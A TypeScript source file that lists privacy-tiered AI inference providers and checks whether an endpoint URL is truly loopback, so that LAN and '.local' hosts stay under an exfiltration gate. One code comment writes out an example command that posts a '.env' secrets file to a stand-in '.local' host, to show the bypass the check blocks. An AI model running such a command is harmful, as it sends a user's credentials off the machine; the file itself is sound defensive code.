import type { PrivacyTier } from "../posture/tiers.ts";

// The privacy-oriented providers this package registers with Pi, with their tier
// and the config a Pi provider entry needs (baseUrl / api / key env). The honest
// notes are ported ~verbatim from privateer 0.2 (tree-cli catalog.ts) — that copy
// is load-bearing: it states the LIMIT of each guarantee, and must not be softened.
//
// Providers deliberately NOT here (together/deepseek/minimax/qwen/…): they have no
// verifiable or default privacy channel, so claiming one would overclaim. They stay
// "standard" and get no badge — same stance as 0.2.

export type ProviderApi =
  | "openai-completions"
  | "openai-responses"
  | "anthropic-messages";

export interface PrivacyProvider {
  id: string;
  label: string;
  // The BEST tier this provider can offer. `postureAware` providers resolve their
  // actual tier at runtime (OpenRouter is zdr-policy until ZDR routing is enforced,
  // then zdr-enforced), so this is the ceiling, not a promise.
  tier: PrivacyTier;
  postureAware?: boolean;
  // True when the provider exposes a remote-attestation endpoint we actively verify
  // (the only path to tee-verified). NEAR = report-body over HTTPS; Tinfoil = SPKI
  // pinned via the out-of-band dispatcher.
  attestable?: boolean;
  baseUrl?: string;
  api: ProviderApi;
  keyEnv?: string; // env template, e.g. "${TINFOIL_API_KEY}"; omit for keyless/local
  local?: boolean;
  // Honest note (ported): states where to get a key AND the limit of the guarantee.
  note: string;
  // Provider-specific request nuances Pi needs (compat), carried through to the entry.
  compat?: Record<string, unknown>;
}

export const PRIVACY_PROVIDERS: PrivacyProvider[] = [
  {
    id: "tinfoil",
    label: "Tinfoil (private TEE inference)",
    tier: "tee-verified",
    attestable: true,
    baseUrl: "https://inference.tinfoil.sh/v1",
    api: "openai-completions",
    keyEnv: "${TINFOIL_API_KEY}",
    note: "tinfoil.sh → dashboard → API Keys. Confidential-enclave inference; verified by attestation + live-TLS-key match.",
  },
  {
    id: "nearai",
    label: "NEAR AI (private TEE inference)",
    tier: "tee-verified",
    attestable: true,
    baseUrl: "https://cloud-api.near.ai/v1",
    api: "openai-completions",
    keyEnv: "${NEARAI_API_KEY}",
    note: "cloud.near.ai → API Keys. Confidential-compute TEE; attestation carried in the report body (verified over HTTPS).",
  },
  {
    id: "venice",
    label: "Venice (no-retention inference)",
    tier: "zdr-policy",
    baseUrl: "https://api.venice.ai/api/v1",
    api: "openai-completions",
    keyEnv: "${VENICE_API_KEY}",
    // Honest copy: policy, not hardware. Venice injects a body param to disable its
    // system prompt — handled by a before_provider_request hook, not config.
    note: 'venice.ai → API Keys (no retention by policy, not TEE-attested; "anonymized" models proxy upstream).',
    compat: { veniceDisableSystemPrompt: true },
  },
  {
    id: "fireworks",
    label: "Fireworks (no-retention inference)",
    tier: "zdr-policy",
    baseUrl: "https://api.fireworks.ai/inference/v1",
    api: "openai-completions",
    keyEnv: "${FIREWORKS_API_KEY}",
    // Honest copy: ZDR is the default for OPEN models only; Fireworks's own f1 /
    // FireFunction may log. Not TEE-attested.
    note: "fireworks.ai → API Keys (open models: zero retention by default, not TEE-attested; Fireworks's own f1/FireFunction may log).",
  },
  {
    id: "privateer-api",
    label: "Privateer (developer API)",
    tier: "zdr-policy",
    baseUrl: "https://api.privateer.pro/v1",
    api: "openai-completions",
    keyEnv: "${PRIVATEER_API_KEY}",
    // Honest copy: a server-proxied developer key (sk-priv-…). Privateer asserts
    // zero retention, but the proxy mediates attestation — a pi client can't verify
    // the underlying enclave end-to-end through it — so this is POLICY, not a
    // client-verified TEE. (Verified-TEE access is the in-app account channel's job.)
    note: "privateer.pro → API keys (sk-priv-…). Server-proxied, zero-retention by policy; NOT TEE-attested end-to-end (the proxy mediates attestation).",
  },
  {
    id: "openrouter",
    label: "OpenRouter",
    tier: "zdr-enforced", // ceiling; posture-aware — see postureAware
    postureAware: true,
    baseUrl: "https://openrouter.ai/api/v1",
    api: "openai-completions",
    keyEnv: "${OPENROUTER_API_KEY}",
    // Honest copy: ZDR is per-model/account. Yellow (zdr-policy) until enforcement
    // pins requests to zero-retention endpoints, then green (zdr-enforced).
    note: "openrouter.ai/keys. ZDR is per-model; not guaranteed until ZDR routing is enforced (then requests only hit zero-retention endpoints).",
    compat: { openRouterRouting: { zdr: true } },
  },
  {
    id: "ollama",
    label: "Ollama (local)",
    tier: "local",
    local: true,
    baseUrl: "http://localhost:11434/v1", // OpenAI-compat surface, not native /api
    api: "openai-completions",
    note: "runs locally — no key needed. Inference on-device; nothing leaves the machine.",
  },
  {
    id: "custom",
    label: "Custom (OpenAI-compatible)",
    tier: "standard", // resolved to `local` at runtime when the baseUrl is loopback
    api: "openai-completions",
    note: "any OpenAI-compatible endpoint — LM Studio, vLLM, llama.cpp, a proxy. Detected as on-device when the URL is loopback.",
  },
];

export const PROVIDER_BY_ID: Record<string, PrivacyProvider> = Object.fromEntries(
  PRIVACY_PROVIDERS.map((p) => [p.id, p]),
);

// A LOOPBACK endpoint? Used to promote `custom` (and confirm `ollama`) to the
// `local` tier — observable, not merely claimed — and, in the tool gate, to decide
// that a destination never leaves the machine.
//
// Loopback ONLY, deliberately. mDNS `.local` names and RFC1918 addresses
// (192.168.x, 10.x, box.lan) resolve to a DIFFERENT HOST on the network: bytes
// leave this machine, cross a wire, and land somewhere we can observe nothing
// about. Grading those "on-device — nothing leaves the machine" would be exactly
// the overclaim this package exists to prevent — and, since a local destination
// is exempt from the exfil gate, `.local` would also be a one-word bypass
// (`curl -d @.env http://drop.local/collect`). They are remote. Treated as remote.
export function isLocalEndpoint(baseUrl?: string): boolean {
  if (!baseUrl) return false;
  let host: string;
  try {
    host = new URL(baseUrl).hostname.toLowerCase();
  } catch {
    return false;
  }
  // URL.hostname keeps IPv6 literals bracketed ("[::1]"), and may carry a zone id
  // ("[fe80::1%25en0]") — neither plays a part in loopback identity.
  if (host.startsWith("[") && host.endsWith("]")) host = host.slice(1, -1);
  const zone = host.indexOf("%");
  if (zone !== -1) host = host.slice(0, zone);

  // RFC 6761: `localhost` and any subdomain of it resolve to loopback.
  if (host === "localhost" || host.endsWith(".localhost")) return true;
  // IPv6 loopback, and the unspecified address (connecting to it reaches this host).
  if (host === "::1" || host === "::") return true;
  // IPv4-mapped IPv6 — compare the embedded v4 address. WHATWG URL normalizes the
  // dotted form to hex (`::ffff:127.0.0.1` → `::ffff:7f00:1`), so accept both.
  let v4 = host;
  if (host.startsWith("::ffff:")) {
    const rest = host.slice(7);
    if (rest.includes(".")) v4 = rest;
    else {
      const groups = rest.split(":");
      if (groups.length !== 2) return false;
      const hi = Number.parseInt(groups[0], 16);
      const lo = Number.parseInt(groups[1], 16);
      if (!Number.isInteger(hi) || !Number.isInteger(lo) || hi > 0xffff || lo > 0xffff) return false;
      v4 = `${hi >>> 8}.${hi & 0xff}.${lo >>> 8}.${lo & 0xff}`;
    }
  }
  const m = /^(\d{1,3})\.(\d{1,3})\.(\d{1,3})\.(\d{1,3})$/.exec(v4);
  if (!m) return false;
  const octets = m.slice(1).map(Number);
  if (octets.some((n) => n > 255)) return false;
  // The WHOLE 127.0.0.0/8 loopback block, not just 127.0.0.1 — plus 0.0.0.0.
  return octets[0] === 127 || v4 === "0.0.0.0";
}
